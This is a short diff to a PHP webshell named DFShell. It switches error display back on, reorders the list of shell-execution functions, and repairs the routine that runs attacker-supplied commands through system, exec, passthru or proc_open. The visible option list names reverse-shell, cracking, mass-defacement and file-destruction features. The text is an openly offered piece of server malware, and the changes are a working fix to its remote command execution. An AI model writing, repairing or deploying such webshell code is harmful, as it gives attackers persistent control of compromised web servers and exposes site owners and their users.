@@ -1,8 +1,8 @@
 <?php
 
-ini_set('display_errors', 0);
-ini_set('display_startup_errors', 0);
-error_reporting(0);
+#ini_set('display_errors', 0);
+#ini_set('display_startup_errors', 0);
+#error_reporting(0);
 # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
 #                                                                               #
 #           This webshell are programmed and modified by Eagle Eye              #
@@ -19,7 +19,7 @@ $DFShell_Ver = 1.0;
 $DFConfig = array($_REQUEST,$_POST,$_SERVER,$_COOKIE,$_FILES);
 $DFSyntax = array("file_get_contents","fileperms","readfile","chdir","getcwd","function_exists","fsockopen","pcntl_fork",
 "stream_set_blocking","proc_get_status","proc_open","proc_close","posix_setsid","stream_select","stream_get_contents"); // $GLOBALS['DFSyntax']
-$DFSCmd = array("shell_exec","system","exec","passthru","proc_open");
+$DFSCmd = array("system","shell_exec","exec","passthru","proc_open");
 $DFSPlatform = strtolower(substr(PHP_OS,0,3));
 $DFSOptions = array("edit","cmd","del","sql","conf","sym","reverse","crack","mass","logout","dest","ren","chmd");
 
@@ -887,14 +887,15 @@ class DFShell{
             foreach($GLOBALS['DFSCmd'] as $cmd){
                 if(!in_array($cmd,$disCMD)){
                     $availCMD = $cmd;
+                    if($availCMD===$GLOBALS['DFSCmd'][4]){
+                        return $this->DFSProcOpen($command);
+                    }else{
+                        return $availCMD($command);
+                    }
                     break;
                 }
             }
-            if($availCMD===$GLOBALS['DFSCmd'][4]){
-                return $this->DFSProcOpen($command);
-            }else{
-                return $availCMD;
-            }
+
         }else{
             system($command);
         }
